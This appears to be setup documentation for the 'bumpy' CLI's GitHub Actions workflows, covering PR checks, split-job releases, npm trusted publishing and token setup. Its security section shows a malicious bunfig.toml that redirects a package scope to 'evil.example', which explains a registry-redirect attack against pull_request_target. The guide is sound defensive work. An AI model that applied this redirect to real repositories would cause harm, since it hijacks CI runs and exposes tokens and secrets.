# GitHub Actions Setup

Bumpy handles CI automation through its `bumpy ci` subcommands — no separate GitHub Action or bot to install. Just call `bumpy ci` directly in your workflows.

These commands facilitate the following:

- **On every PR** - check that PRs have bump files, add/update a comment with the release plan, outlining which packages will be bumped from the PR
- **When a regular PR merges to main** - create/update a special "release PR" which updates changelogs and version numbers, and deletes the bump files
- **When release PR is merged** - trigger the release process

> **Using npm / pnpm / yarn instead of bun?** All examples below use `bun` / `bunx` for brevity, but bumpy itself is package-manager agnostic. Substitute:
>
> - `oven-sh/setup-bun@v2` → `actions/setup-node@v6` (+ `pnpm/action-setup` if using pnpm)
> - `bun install` → `npm ci` / `pnpm install --frozen-lockfile` / `yarn install --immutable`
> - `bunx @varlock/bumpy@…` → `npx @varlock/bumpy@…` / `pnpm dlx @varlock/bumpy@…` / `yarn dlx @varlock/bumpy@…`
>
> The version-resolution shell snippets work as-is regardless of package manager — they only depend on `jq` and `git`, both preinstalled on GitHub-hosted runners.

## PR check workflow

Posts/updates the release-plan comment on every PR, including PRs from forks. **Copy it as-is and you're covered** — it's structured so nothing in a fork PR can influence how bumpy is fetched or run. (If you change `main` to your own base branch, that's the only edit most repos need. See the security notes below before restructuring it.)

```yaml
# .github/workflows/bumpy-check.yaml
name: Bumpy Check

on: pull_request_target # so it can post comments on fork PRs

permissions:
  pull-requests: write
  contents: read

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      # 1. TRUSTED checkout of the base branch — bumpy is fetched and run from
      #    here, so the package-manager config in effect (bunfig.toml, .npmrc)
      #    is YOURS, not the PR's. Hardcoded "main" (the PR controls its own
      #    base ref); change it to your base branch.
      - uses: actions/checkout@v6
        with:
          ref: main
          persist-credentials: false

      # 2. UNTRUSTED PR head into ./pr — only READ from here, never run it.
      - uses: actions/checkout@v6
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          path: pr
          persist-credentials: false

      - uses: oven-sh/setup-bun@v2

      # ⚠️ DO NOT bun install / npm install / run any script from ./pr ⚠️

      # Read bumpy's version from the TRUSTED base checkout, never from ./pr.
      - name: Resolve bumpy version from base
        run: |
          VERSION=$(jq -r '.devDependencies["@varlock/bumpy"] // .dependencies["@varlock/bumpy"]' package.json | sed 's/[\^~]//')
          echo "BUMPY_VERSION=$VERSION" >> "$GITHUB_ENV"

      # bunx runs from the trusted root; `--cwd ./pr` only points bumpy at the
      # PR tree to read its bump files. Quote the version arg against injection.
      - run: bunx "@varlock/bumpy@$BUMPY_VERSION" ci check --cwd ./pr
        env:
          GH_TOKEN: ${{ github.token }}
```

### ⚠️ Security essentials

`pull_request_target` carries a **write token and secrets even on fork PRs** — that's what lets it comment on forks, and why a PR author must never be able to influence what runs. The workflow above handles this; two rules to preserve if you adapt it:

- **Never execute PR code** — no `bun install` / `npm install` (postinstall scripts run), no `bun run <script>` / `npm test`, no building from the PR tree.
- **Fetch and run bumpy from the trusted base checkout; only _read_ the PR tree** via `--cwd ./pr`. Keep `persist-credentials: false` on both checkouts.

> **Using npm / pnpm / yarn?** The same pattern applies — run `npx` / `pnpm dlx` / `yarn dlx` from the trusted root and pass `--cwd ./pr` to bumpy, never the reverse. It matters even more there: pnpm and yarn honor committed config that runs code directly (pnpm's `.pnpmfile.cjs`, yarn's `yarnPath`/`plugins`), not just registry redirects — see the [Turborepo `yarnPath` RCE](https://github.com/vercel/turborepo/security/advisories/GHSA-3qcw-2rhx-2726) for the real-world version.

<details>
<summary><strong>Why two checkouts? The registry-redirect attack (worth reading before you restructure this)</strong></summary>

The non-obvious risk isn't just running PR scripts — it's **how bumpy itself gets fetched**. Running `bunx @varlock/bumpy@<version>` reads package-manager config (`bunfig.toml`, `.npmrc`) **from the current working directory**. A fork PR can commit one that redirects the `@varlock` scope (or the whole registry) to its own server:

```toml
# bunfig.toml committed in a malicious PR
[install.scopes]
"@varlock" = { url = "https://evil.example/" }
```

If `bunx` runs with the PR checkout as its working directory, it downloads _the attacker's_ `@varlock/bumpy` — at the exact version you pinned — and executes its bin with your write token and secrets in scope. **Pinning the version is no defense; the version is honored, only the source is swapped.** Same for `npx`/`pnpm`/`yarn`.

The two-checkout layout closes this by **separating where bumpy is fetched from what bumpy reads**:

- bumpy is resolved and run from the **trusted base checkout**, so the `bunfig.toml`/`.npmrc` in effect are yours, not the PR's.
- `--cwd ./pr` points the already-running bumpy process at the PR tree. The binary is already fetched by then — config in `./pr` is never consulted by a package manager. `bumpy ci check` only reads files and shells out to `git`/`gh`, so it's safe to aim at untrusted source.
- `persist-credentials: false` keeps the workflow token out of the on-disk `.git/config` sitting next to untrusted code.

**Don't use the single-checkout shortcut.** Checking out the PR head into the workspace root and running `bunx … --cwd .` reopens the hole — that puts the PR's `bunfig.toml`/`.npmrc` back in `bunx`'s working directory. The whole point is that `bunx`'s working directory is trusted.

</details>

<details>
<summary>How the bumpy version stays in sync (and what to adjust for your setup)</summary>

`jq … package.json` reads bumpy's version from the **base checkout** (`main`) at workflow runtime, so:

- **No version pinned in the workflow file** — Renovate/Dependabot bumps to `package.json` flow through automatically.
- **Fork PRs can't swap the bumpy version** — the source of truth is `main`, read from the trusted root checkout (never from `./pr`).

Adjust if your setup differs:

- Default branch isn't `main`? Change the `ref: main` in the first checkout to your base branch.
- `@varlock/bumpy` lives somewhere other than root `package.json` (e.g. a sub-package)? Point the `jq` path at that file.

You can also pin the version directly (`bunx @varlock/bumpy@1.2.3 ci check --cwd ./pr`), but we prefer a single source of truth.

</details>

### Don't need fork PR support?

If you don't care about posting comments on external/fork PRs (private repo, internal-only contributors, etc.), you can skip the separate workflow entirely. Just add a step to your existing `pull_request` CI workflow:

```yaml
- run: bunx @varlock/bumpy ci check
  env:
    GH_TOKEN: ${{ github.token }}
```

Make sure the job has `permissions: pull-requests: write`. Since `pull_request` runs in a non-privileged context, all the "no installs / no PR scripts" rules above don't apply — you can `bun install` and run bumpy from your devDeps like any other CLI. The trade-off: fork PRs won't get a comment (the check still runs and fails red on missing bump files, just without the helpful explanation).

## Release workflow (recommended: split jobs)

The recommended release workflow splits version-PR maintenance from publishing into separate jobs. Only the publish job carries `id-token: write` and npm credentials, and it runs inside a GitHub Environment — so a rogue workflow elsewhere in the repo can't request an OIDC token that npm will accept.

```yaml
# .github/workflows/bumpy-release.yml
name: Bumpy Release
on:
  push:
    # Add any prerelease channel branches here too, e.g. [main, next, beta].
    # See the prerelease channels docs: https://github.com/dmno-dev/bumpy/blob/main/docs/prereleases.md
    branches: [main]

concurrency:
  # Per-ref: serialize a branch's releases, let different branches run in parallel
  group: bumpy-release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  # Detect what `ci release` would do — no write permissions, no publish credentials.
  # Also resolves bumpy's version once and exposes it as an output for downstream jobs.
  plan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    outputs:
      mode: ${{ steps.plan.outputs.mode }}
      packages: ${{ steps.plan.outputs.packages }}
      bumpy_version: ${{ steps.bumpy-version.outputs.version }}
    steps:
      - uses: actions/checkout@v6
        with:
          fetch-depth: 0
      - uses: oven-sh/setup-bun@v2
      # No `bun install` — bumpy reads files (package.jsons, bump files) and doesn't need your workspace deps resolved
      # We just pin its version from package.json and let bunx fetch it
      - id: bumpy-version
        name: Resolve bumpy version
        run: |
          VERSION=$(jq -r '.devDependencies["@varlock/bumpy"] // .dependencies["@varlock/bumpy"]' package.json | sed 's/[\^~]//')
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
          echo "BUMPY_VERSION=$VERSION" >> "$GITHUB_ENV"
      - id: plan
        run: bunx "@varlock/bumpy@$BUMPY_VERSION" ci plan
        env:
          GH_TOKEN: ${{ github.token }}

  # Creates/updates the Version Packages PR. No publish credentials.
  version-pr:
    needs: plan
    if: needs.plan.outputs.mode == 'version-pr'
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
    env:
      BUMPY_VERSION: ${{ needs.plan.outputs.bumpy_version }}
    steps:
      - uses: actions/checkout@v6
        with:
          fetch-depth: 0
      - uses: oven-sh/setup-bun@v2
      - run: bunx "@varlock/bumpy@$BUMPY_VERSION" ci release --expect-mode version-pr
        env:
          GH_TOKEN: ${{ github.token }}
          BUMPY_GH_TOKEN: ${{ secrets.BUMPY_GH_TOKEN }} # so the version PR triggers CI

  # Publishes packages. Scoped to the `publish` environment.
  publish:
    needs: plan
    if: needs.plan.outputs.mode == 'publish'
    runs-on: ubuntu-latest
    environment: publish
    permissions:
      contents: write
      id-token: write # required for npm trusted publishing (OIDC) and provenance
    env:
      BUMPY_VERSION: ${{ needs.plan.outputs.bumpy_version }}
    steps:
      - uses: actions/checkout@v6
        with:
          fetch-depth: 0
      - uses: oven-sh/setup-bun@v2
      - uses: actions/setup-node@v6
        with:
          node-version: latest
      - run: npm install -g npm@latest # ensure npm >= 11.15.0 for OIDC/staged publishing
      # Build steps that need to happen before publish go here. If your build
      # needs workspace deps, add `bun install` first:
      #   - run: bun install
      #   - run: bun run build
      - run: bunx "@varlock/bumpy@$BUMPY_VERSION" ci release --expect-mode publish
        env:
          GH_TOKEN: ${{ github.token }}
          BUMPY_GH_TOKEN: ${{ secrets.BUMPY_GH_TOKEN }} # so `release: published` workflows trigger
```

**How the three jobs interact:**

- `plan` runs `bumpy ci plan` to determine whether the current push should update the Version Packages PR (`version-pr`), publish unpublished packages (`publish`), or do nothing. It also resolves bumpy's version from `package.json` and exposes it as the `bumpy_version` output so downstream jobs don't have to re-resolve.
- Only one of `version-pr` or `publish` runs per push. The other is skipped via the `if:` condition.
- The `--expect-mode` flag on `ci release` asserts that the detected mode matches what each job expects — if the runtime state ever drifts, the job fails loudly instead of silently doing the wrong thing.
- Expensive build steps (compilation, tests, bundling) only run inside the `publish` job, so PR merges that just maintain the version PR stay cheap.

### Required setup

1. **Pin the npm trusted publisher to environment `publish`** on each package's npmjs.com settings → Trusted Publishers → GitHub Actions. Set the environment field to `publish`. This binds the OIDC trust to that specific environment — even if someone adds a rogue workflow file, npm will reject any token request that doesn't carry the `publish` environment claim.
2. **Set `BUMPY_GH_TOKEN`** — see [Token setup](#token-setup) below.

That's it — the `publish` environment auto-creates on the first publish run, so no manual GitHub setup is required.

### Optional hardening: protection rules on the `publish` environment

If you create the environment manually in repo Settings → Environments _before_ the first publish, you can attach protection rules:

- **Restrict deployment branches to `main`** — recommended. Cheap defense in depth: non-`main` refs can never request an OIDC token from this environment, even if a workflow trigger is accidentally widened later. If you use [prerelease channels](prereleases.md), also add each channel branch (e.g. `next`) to the allowed list — otherwise channel publishes fail when the job can't enter the environment.
- **Required reviewers** — optional. Adds a manual approval gate before each publish. Usually redundant if `npmStaged: true` is enabled (below), since you already have a 2FA approval gate on npmjs.com.

**Recommended publish config** — enable provenance and staged publishing for maximum security:

```json
{
  "publish": {
    "provenance": true,
    "npmStaged": true
  }
}
```

> **Staged publishing:** With `npmStaged` enabled, bumpy uses `npm stage publish` to stage packages on npmjs.com, requiring manual 2FA approval before they go live — even if your CI credentials are compromised, nothing gets published without maintainer approval. See the [staged publishing docs](./configuration.md#staged-publishing) for details.

### Using `NPM_TOKEN` instead of OIDC

If you can't use trusted publishing, swap `id-token: write` for an `NPM_TOKEN` secret. Scope the secret to the `publish` environment (repo Settings → Environments → publish → Add secret) so only this job can read it:

```yaml
publish:
  needs: plan
  if: needs.plan.outputs.mode == 'publish'
  runs-on: ubuntu-latest
  environment: publish
  permissions:
    contents: write
  steps:
    # ... checkout/setup-bun/setup-node/install steps ...
    - run: bunx @varlock/bumpy ci release --expect-mode publish
      env:
        GH_TOKEN: ${{ github.token }}
        NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        BUMPY_GH_TOKEN: ${{ secrets.BUMPY_GH_TOKEN }}
```

## Release workflow (simplified single-job)

For simpler setups, you can run everything in a single job. `bumpy ci release` will smart-route between version-PR and publish based on the current state.

```yaml
# .github/workflows/bumpy-release.yml
name: Bumpy Release
on:
  push:
    # Add any prerelease channel branches here too, e.g. [main, next, beta].
    # See the prerelease channels docs: https://github.com/dmno-dev/bumpy/blob/main/docs/prereleases.md
    branches: [main]

concurrency:
  # Per-ref: serialize a branch's releases, let different branches run in parallel
  group: bumpy-release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
      id-token: write # required for npm trusted publishing (OIDC)
    steps:
      - uses: actions/checkout@v6
        with:
          fetch-depth: 0
      - uses: oven-sh/setup-bun@v2
      - uses: actions/setup-node@v6
        with:
          node-version: latest
      - run: npm install -g npm@latest
      - run: bun install
      - run: bunx @varlock/bumpy ci release
        env:
          GH_TOKEN: ${{ github.token }}
          BUMPY_GH_TOKEN: ${{ secrets.BUMPY_GH_TOKEN }}
```

**Trade-off:** this is the shortest workflow you can write, but `id-token: write` and any publish secrets are exposed on every push to main — including pushes that only update the version PR. The split-job workflow above scopes those credentials to the publish step only. Prefer the split workflow unless you have a strong reason not to.

## Auto-publish mode (not recommended)

`bumpy ci release --auto-publish` collapses version + publish into a single run, skipping the Version Packages PR. This forfeits the preview/review gate on version bumps — every merge to main with a bump file ships immediately. It's also incompatible with the [split-job pattern](#release-workflow-recommended-split-jobs) above, since both paths run in one command. Prefer the default flow. See [the CLI reference](cli.md#bumpy-ci-release) if you still need it.

## Advanced: per-package conditional builds

If you have one expensive package whose build you only want to run when that package itself is being released, use `ci plan`'s `packages` output to gate per-package steps:

```yaml
- id: plan
  run: bunx @varlock/bumpy ci plan
  env:
    GH_TOKEN: ${{ github.token }}

# Build only when this specific package is being released
- if: contains(fromJSON(steps.plan.outputs.packages), 'my-expensive-package')
  run: bun run build --filter=my-expensive-package
```

`ci plan` outputs:

| Output     | Description                                                   |
| ---------- | ------------------------------------------------------------- |
| `mode`     | `version-pr`, `publish`, or `nothing`                         |
| `packages` | JSON array of package names (for `fromJSON()` + `contains()`) |
| `json`     | Full JSON output (for `fromJSON()`)                           |

## Concurrency

Use a concurrency group on your release workflow to prevent overlapping publish runs. Without this, rapid merges to main could trigger multiple workflows that race to publish the same packages.

```yaml
concurrency:
  group: bumpy-release-${{ github.ref }}
  cancel-in-progress: false # queue rather than cancel — don't skip releases
```

This is included in all the workflow examples above. Per-ref serializes each branch's releases against themselves while letting different branches publish in parallel. It's the right default everywhere: with a single release branch it behaves identically to a plain group, and once you add [prerelease channels](prereleases.md) it stops a `next` prerelease publish from queueing behind — or, with `cancel-in-progress: true`, being cancelled by — a `main` release, even though they touch different dist-tags and never conflict.

## Token setup

### `GH_TOKEN` (required)

The default `${{ github.token }}` covers general API access (registry lookups, reading PRs, posting comments).

**Permissions needed per job:**

- `pull-requests: write` — for posting PR comments (`ci check`) or creating the version PR (`version-pr` job)
- `contents: write` — for pushing commits and tags (release jobs)
- `id-token: write` — for npm trusted publishing / OIDC (publish job only)

### `BUMPY_GH_TOKEN` (recommended)

GitHub's anti-recursion guard prevents PRs created by the default `github.token` from triggering other workflows. This means your regular CI workflows (tests, linting, etc.) won't run automatically on the Version Packages PR — so you can't verify that the version bumps don't break anything before merging.

To fix this, provide a `BUMPY_GH_TOKEN` using either a **fine-grained PAT** or a **GitHub App token**. Bumpy uses this token selectively — only for the specific operations where bypassing the anti-recursion guard matters (pushing the version branch, creating the version PR, creating the GitHub release). Everything else continues to use the default `GH_TOKEN`.

> **Note:** If you're using a developer's personal PAT, the version PR will be authored by that developer. Consider using a dedicated bot account or GitHub App so the developer can still review and approve the PR.

Run `bumpy ci setup` for interactive guidance, or set it up manually:

#### Option 1: Fine-grained personal access token

1. Go to [GitHub → Settings → Personal access tokens → Fine-grained tokens](https://github.com/settings/personal-access-tokens)
2. Create a new token with:
   - **Repository access:** select your repo only
   - **Permissions:**
     - Contents: Read and write
     - Pull requests: Read and write
     - Metadata: Read (auto-selected)
3. Add it as a repository secret named `BUMPY_GH_TOKEN`

#### Option 2: GitHub App token

For organizations, a GitHub App avoids tying automation to a personal account:

1. Create a GitHub App with Contents and Pull Requests permissions (read & write)
2. Install it on your repository
3. Store `BUMPY_APP_ID` and `BUMPY_APP_PRIVATE_KEY` as repository secrets
4. Generate the token in your workflow:
   ```yaml
   - uses: actions/create-github-app-token@v2
     id: app-token
     with:
       app-id: ${{ secrets.BUMPY_APP_ID }}
       private-key: ${{ secrets.BUMPY_APP_PRIVATE_KEY }}
   - run: bunx @varlock/bumpy ci release
     env:
       GH_TOKEN: ${{ github.token }}
       BUMPY_GH_TOKEN: ${{ steps.app-token.outputs.token }}
   ```

### `NPM_TOKEN` (if not using trusted publishing)

A classic npm access token. Create one at [npmjs.com → Access Tokens](https://www.npmjs.com/settings/~/tokens) and add it as a secret on the `publish` environment (repo Settings → Environments → publish → Add secret) so only the publish job can read it.

## Environment variables summary

| Variable         | Required          | Used by                  | Description                                                                   |
| ---------------- | ----------------- | ------------------------ | ----------------------------------------------------------------------------- |
| `GH_TOKEN`       | Yes               | `ci check`, `ci release` | GitHub token for API access — `${{ github.token }}` is fine                   |
| `BUMPY_GH_TOKEN` | Recommended       | `ci check`, `ci release` | PAT or App token — selectively used for ops where workflow-triggering matters |
| `NPM_TOKEN`      | If not using OIDC | publish job              | npm access token for publishing                                               |
